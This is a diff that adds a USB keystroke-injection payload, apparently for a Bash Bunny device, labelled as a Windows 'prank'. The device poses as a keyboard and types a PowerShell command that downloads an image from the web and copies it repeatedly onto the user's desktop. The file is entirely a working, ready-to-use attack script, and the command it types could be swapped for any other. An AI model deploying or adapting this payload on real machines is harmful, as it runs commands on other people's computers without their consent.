@@ -1,0 +1,34 @@
+#!/bin/bash
+############################################
+# Credits: Me :P			   #
+# Class: Prank				   #
+# Config: change image or set amount       #
+# Target: Windows			   #
+# Reason: Why not?			   #
+############################################
+
+#--// CONFIG \\--#
+
+ImageLink='http://i.pinimg.com/originals/5f/3c/23/5f3c23fc62ce87c45918bd6c086228bd.jpg'
+
+Amount=4
+
+
+#--// SETUP \\--#
+
+LED Y
+
+ATTACKMODE HID
+
+
+#--// ATTACK \\--#
+
+RUN WIN "cmd /c powershell \"curl $ImageLink -O C:\Users\%USERNAME%\Desktop\lol.jpg; sleep 1; 1..$Amount | % { copy-Item \"C:\Users\%USERNAME%\desktop\lol.jpg\" \"C:\Users\%USERNAME%\desktop\lol\$_.jpg\"}\""
+
+Q ENTER
+
+
+#--// DONE \\--#
+
+LED G
+
